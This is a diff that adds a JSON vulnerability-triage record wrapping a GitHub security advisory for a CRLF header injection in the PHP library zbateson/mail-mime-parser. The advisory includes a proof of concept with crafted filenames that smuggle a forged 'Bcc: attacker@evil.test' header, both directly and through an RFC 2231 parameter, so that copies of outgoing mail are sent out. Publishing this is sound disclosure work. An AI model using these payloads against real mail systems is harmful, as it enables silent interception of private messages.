@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/158724?v=4\", \"events_url\": \"https://api.github.com/users/iliaal/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/iliaal/followers\", \"following_url\": \"https://api.github.com/users/iliaal/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/iliaal/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/iliaal\", \"id\": 158724, \"login\": \"iliaal\", \"node_id\": \"MDQ6VXNlcjE1ODcyNA==\", \"organizations_url\": \"https://api.github.com/users/iliaal/orgs\", \"received_events_url\": \"https://api.github.com/users/iliaal/received_events\", \"repos_url\": \"https://api.github.com/users/iliaal/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/iliaal/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/iliaal/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/iliaal\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61815\", \"cvss\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-93\", \"name\": \"Improper Neutralization of CRLF Sequences ('CRLF Injection')\"}], \"description\": \"### Impact\\n\\nA CRLF (carriage-return / line-feed) header injection  affecting any application that uses this library to build or forward MIME messages with an attacker-influenced attachment filename.\\n  \\nAttachment filenames are interpolated into the `Content-Type` and `Content-Disposition` header values without stripping CR/LF, so a filename containing `\\\\r\\\\n` serializes as one or more additional, attacker-controlled header lines (for example a forged `Bcc:` that silently exfiltrates a copy of the outgoing message). The untrusted filename can come directly from parsed inbound mail, so no local construction is required — an application that re-attaches or re-sends a parsed filename is exposed.\\n\\n### Details\\n\\nOn the outbound side, `MultipartHelper::createAndAddPartForAttachment()` sanitizes the filename only with `iconv('UTF-8','US-ASCII//translit//ignore', $filename)`. CR and LF are valid US-ASCII, so they survive that filter, and the value is then written into the header verbatim via `MimePart::setRawHeader()`. A filename of `doc\\\\r\\\\nBcc: attacker@evil.test` therefore serializes as:\\n\\n```\\nContent-Disposition: attachment;\\n filename=\\\"doc\\nBcc: attacker@evil.test\\\"\\n```\\n\\nThe `filename` value closes after `doc`, and `Bcc: attacker@evil.test` stands as its own header line.\\n\\nThe decode side is affected as well, which is what makes purely inbound exploitation possible:\\n\\n- `ParameterPart::decodePartValue()` `rawurldecode()`s an RFC 2231 `filename*=` parameter with no control-character stripping, so\\n  a crafted `filename*=utf-8''doc%0D%0ABcc:...` makes `getFilename()` return a string with embedded `\\\\r\\\\n`.\\n- The RFC 2047 path (`MimeToken`) strips `\\\\r`/`\\\\n` from the *encoded* word, but then base64/quoted-printable-decodes it, which\\n  can reintroduce CR/LF into the decoded value.\\n\\nAs a result `getFilename()` can already hand back a value containing newlines for crafted inbound mail, which then flows into outbound headers when that filename is reused.\\n\\n### Proof of concept\\n\\n```php\\ncomposer require zbateson/mail-mime-parser\\n\\n<?php\\nrequire 'vendor/autoload.php';\\nuse ZBateson\\\\MailMimeParser\\\\MailMimeParser;\\nuse ZBateson\\\\MailMimeParser\\\\Message;\\n\\n$parser = new MailMimeParser();\\n\\nfunction attachAndReport(string $filename): void {\\n    $out = Message::from(\\\"From: me@host\\\\r\\\\nContent-Type: text/plain\\\\r\\\\n\\\\r\\\\nhi\\\\r\\\\n\\\", false);\\n    $out->addAttachmentPart('payload', 'application/octet-stream', $filename);\\n    echo (strpos($out->__toString(), \\\"\\\\r\\\\nBcc: attacker@evil.test\\\") !== false)\\n        ? \\\"INJECTED\\\\n\\\" : \\\"clean\\\\n\\\";\\n}\\n\\nattachAndReport('invoice.pdf');                    // => clean\\nattachAndReport(\\\"doc\\\\r\\\\nBcc: attacker@evil.test\\\"); // => INJECTED\\n\\n// The CRLF reaches getFilename() straight from parsed mail via an\\n// RFC 2231 filename*= parameter, so no local construction is needed:\\n$inbound = \\\"Content-Type: multipart/mixed; boundary=b\\\\r\\\\n\\\\r\\\\n\\\"\\n    . \\\"--b\\\\r\\\\nContent-Type: application/octet-stream\\\\r\\\\n\\\"\\n    . \\\"Content-Disposition: attachment; filename*=utf-8''doc%0D%0ABcc:%20attacker@evil.test\\\\r\\\\n\\\\r\\\\n\\\"\\n    . base64_encode('data') . \\\"\\\\r\\\\n--b--\\\\r\\\\n\\\";\\n$fn = $parser->parse($inbound, false)->getAllAttachmentParts()[0]->getFilename();\\nvar_dump($fn);        // => string(28) \\\"doc\\\\r\\\\nBcc: attacker@evil.test\\\"\\nattachAndReport($fn); // => INJECTED\\n```\\n\\n### Patches\\n\\nFixed in 4.0.2 and 3.0.6. Users should upgrade to one of these (or later) versions.\\n\\nVersions 1.x and 2.x are also affected but are end-of-life and will not receive patches; users on those lines should upgrade to a fixed release.\\n\\n### Workarounds\\n\\nIf upgrading is not immediately possible, strip CR and LF from any filename before passing it to attachment APIs, and from the result of getFilename() before reusing it in a constructed message — e.g. preg_replace('/[\\\\r\\\\n]+/', ' ', $filename).\\n\\n- Found and reported privately by Ilia Alshanetsky (@iliaal), who also proposed fixes that informed the patches.\", \"ghsa_id\": \"GHSA-36h5-qg4p-q2qf\", \"github_reviewed_at\": \"2026-09-24T19:46:32Z\", \"html_url\": \"https://github.com/advisories/GHSA-36h5-qg4p-q2qf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-36h5-qg4p-q2qf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61815\"}], \"nvd_published_at\": \"2026-09-24T18:17:17Z\", \"published_at\": \"2026-09-24T19:46:32Z\", \"references\": [\"https://github.com/zbateson/mail-mime-parser/security/advisories/GHSA-36h5-qg4p-q2qf\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61815\", \"https://github.com/zbateson/mail-mime-parser/commit/81859c06abb5d79f04b7a3254d293d0a91065948\", \"https://github.com/zbateson/mail-mime-parser/commit/d2970b5df266f62e5ee8e675bfb05502b70fc6e1\", \"https://github.com/zbateson/mail-mime-parser/releases/tag/3.0.7\", \"https://github.com/zbateson/mail-mime-parser/releases/tag/4.0.2\", \"https://github.com/advisories/GHSA-36h5-qg4p-q2qf\"], \"repository_advisory_url\": \"https://api.github.com/repos/zbateson/mail-mime-parser/security-advisories/GHSA-36h5-qg4p-q2qf\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/zbateson/mail-mime-parser\", \"summary\": \"zbateson/mail-mime-parser has CRLF header injection via attachment filename\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-24T19:46:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-36h5-qg4p-q2qf\", \"vulnerabilities\": [{\"first_patched_version\": \"3.0.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"zbateson/mail-mime-parser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.0.6\"}, {\"first_patched_version\": \"4.0.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"zbateson/mail-mime-parser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 4.0.0, < 4.0.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-36h5-qg4p-q2qf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "zbateson/mail-mime-parser: < 3.0.6",
+      "zbateson/mail-mime-parser: >= 4.0.0, < 4.0.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-61815"
+    ],
+    "cvss_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "zbateson/mail-mime-parser"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-25T19:13:21.127057Z",
+  "provenance": {
+    "content_sha256": "cc878ef5dfb1663e7e76f91a8bf3eaf6c10c49b93d346b595d778e89aafa5f29",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-24T19:46:32Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-36h5-qg4p-q2qf",
+  "status": "active",
+  "title": "zbateson/mail-mime-parser has CRLF header injection via attachment filename",
+  "updated_at": "2026-09-24T19:46:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-36h5-qg4p-q2qf"
+}
